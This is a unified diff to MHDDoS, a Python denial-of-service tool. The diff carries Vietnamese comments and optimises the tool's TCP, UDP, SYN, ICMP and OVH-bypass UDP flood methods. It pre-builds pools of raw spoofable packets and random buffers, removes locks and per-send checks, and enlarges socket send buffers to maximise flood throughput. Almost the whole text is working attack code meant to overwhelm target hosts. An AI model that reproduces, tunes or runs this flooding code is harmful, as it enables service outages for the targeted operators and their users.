@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import sys
+from socket import SOL_SOCKET, SO_SNDBUF
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from itertools import cycle
@@ -38,6 +39,7 @@ from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from base64 import b64encode
 
+sys.setswitchinterval(0.005)     # mặc định 0.005s -> tăng lên giảm context switch
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
 logger = getLogger("MHDDoS")
@@ -232,22 +234,21 @@ search_engine_agents = [
 
 
 class Counter:
-    """Bộ đếm dùng chung giữa các thread: có lock, số nguyên 64-bit (không tràn)."""
+    """Đếm nhanh: RawValue không lock (sai số cực nhỏ), 64-bit."""
+    __slots__ = ("_value",)
 
     def __init__(self, value: int = 0):
-        self._value = Value('q', value)
+        self._value = RawValue('q', value)
 
     def __iadd__(self, value: int):
-        with self._value.get_lock():
-            self._value.value += value
+        self._value.value += value
         return self
 
     def __int__(self) -> int:
         return self._value.value
 
     def set(self, value: int):
-        with self._value.get_lock():
-            self._value.value = value
+        self._value.value = value
         return self
 
 
@@ -475,6 +476,20 @@ class Layer4(Thread):
     _amp_payloads = cycle
     _proxies: List[Proxy] = None
 
+    # --- pool dùng lại, tránh syscall trong hot loop ---
+    BUF_SIZE = 512
+    BUF_COUNT = 128
+    _buf_pool: List[bytes] = None
+    _syn_pool: List[bytes] = None
+    _syn_target: Any = None
+    _icmp_pkt: bytes = None
+    _ovh_pool: List[bytes] = None
+
+    def _bufs(self) -> List[bytes]:
+        if Layer4._buf_pool is None:
+            Layer4._buf_pool = [randbytes(self.BUF_SIZE) for _ in range(self.BUF_COUNT)]
+        return Layer4._buf_pool
+
     def __init__(self,
                  target: Tuple[str, int],
                  ref: List[str] = None,
@@ -508,6 +523,24 @@ class Layer4(Thread):
             "MCBOT": self.MCBOT,
         }
 
+    def _syns(self) -> List[bytes]:
+        if Layer4._syn_target != self._target:
+            pkts = []
+            for _ in range(512):
+                ip = IP()
+                ip.set_ip_src(__ip__)
+                ip.set_ip_dst(self._target[0])
+                tcp = TCP()
+                tcp.set_SYN()
+                tcp.set_th_flags(0x02)
+                tcp.set_th_dport(self._target[1])
+                tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
+                ip.contains(tcp)
+                pkts.append(ip.get_packet())
+            Layer4._syn_pool = pkts
+            Layer4._syn_target = self._target
+        return Layer4._syn_pool
+
     def run(self) -> None:
         if self._synevent is None:
             self._synevent = Event()
@@ -532,10 +565,28 @@ class Layer4(Thread):
         return s
 
     def TCP(self) -> None:
+        bufs = self._bufs()
+        nb = len(bufs)
+        i = n = 0
+        bs = self.BUF_SIZE
+        ev = self._synevent
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while self._synevent.is_set() and Tools.send(s, randbytes(1024)):
-                continue
+            s.settimeout(None)               # blocking -> bỏ poll() mỗi send
+            send = s.send
+            while ev.is_set():
+                send(bufs[i])
+                i += 1
+                if i >= nb:
+                    i = 0
+                n += 1
+                if n >= 4096:
+                    REQUESTS_SENT += n
+                    BYTES_SEND += n * bs
+                    n = 0
+            if n:
+                REQUESTS_SENT += n
+                BYTES_SEND += n * bs
         Tools.safe_close(s)
 
     def MINECRAFT(self) -> None:
@@ -572,39 +623,106 @@ class Layer4(Thread):
             REQUESTS_SENT += 1
 
     def UDP(self) -> None:
+        bufs = self._bufs()
+        nb = len(bufs)
+        i = 0
+        n = 0
+        bs = self.BUF_SIZE
+        target = self._target
+        ev = self._synevent
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            s.settimeout(.9)
-            while self._synevent.is_set() and Tools.sendto(s, randbytes(1024), self._target):
-                continue
+            with suppress(OSError):
+                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)   # 4MB -> không drop
+            if sys.platform == "win32":                        # tránh WSAECONNRESET
+                with suppress(Exception):
+                    s.ioctl(socket.SIO_UDP_CONNRESET, False)
+            sendto = s.sendto
+            while ev.is_set():
+                sendto(bufs[i], target)
+                i += 1
+                if i >= nb:
+                    i = 0
+                n += 1
+                if n >= 4096:                 # flush counter theo lô
+                    REQUESTS_SENT += n
+                    BYTES_SEND += n * bs
+                    n = 0
+            if n:
+                REQUESTS_SENT += n
+                BYTES_SEND += n * bs
         Tools.safe_close(s)
 
+    def _ovh_packets(self) -> List[bytes]:
+        if Layer4._ovh_pool is None:
+            pool = []
+            for _ in range(64):
+                ip = IP()
+                ip.set_ip_src(__ip__)
+                ip.set_ip_dst(self._target[0])
+                udp = UDP()
+                udp.set_uh_sport(randint(1024, 65535))
+                udp.set_uh_dport(self._target[1])
+                method = randchoice(["PGET", "POST", "HEAD", "OPTIONS", "PURGE"])
+                path = randchoice(['/0/0/0/0/0/0', '/', '/null', '/%00%00%00%00'])
+                body = randbytes(randint(1024, 2048))
+                udp.contains(Data(b"%s %s HTTP/1.1\r\nHost: x\r\n\r\n" % (
+                    method.encode(), path.encode()) + body))
+                ip.contains(udp)
+                pool.append(ip.get_packet())
+            Layer4._ovh_pool = pool
+        return Layer4._ovh_pool
+
     def OVHUDP(self) -> None:
+        pkts = self._ovh_packets()
+        nb = len(pkts)
+        i = 0
+        ev = self._synevent
+        target = self._target
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while self._synevent.is_set():
-                for payload in self._generate_ovhudp():
-                    if not self._synevent.is_set():
-                        break
-                    Tools.sendto(s, payload, self._target)
+            sendto = s.sendto
+            while ev.is_set():
+                sendto(pkts[i], target)
+                i += 1
+                if i >= nb:
+                    i = 0
         Tools.safe_close(s)
 
     def ICMP(self) -> None:
-        payload = self._genrate_icmp()
+        if Layer4._icmp_pkt is None:
+            Layer4._icmp_pkt = self._genrate_icmp()
+        payload = Layer4._icmp_pkt
+        ev = self._synevent
+        target = self._target
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while self._synevent.is_set() and Tools.sendto(s, payload, self._target):
-                continue
+            with suppress(OSError):
+                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)
+            sendto = s.sendto
+            while ev.is_set():
+                sendto(payload, target)
         Tools.safe_close(s)
 
     def SYN(self) -> None:
+        pkts = self._syns()
+        nb = len(pkts)
+        i = 0
+        ev = self._synevent
+        target = self._target
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while self._synevent.is_set() and Tools.sendto(s, self._genrate_syn(), self._target):
-                continue
+            with suppress(OSError):
+                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)
+            sendto = s.sendto
+            while ev.is_set():
+                sendto(pkts[i], target)
+                i += 1
+                if i >= nb:
+                    i = 0
         Tools.safe_close(s)
 
     def AMP(self) -> None:
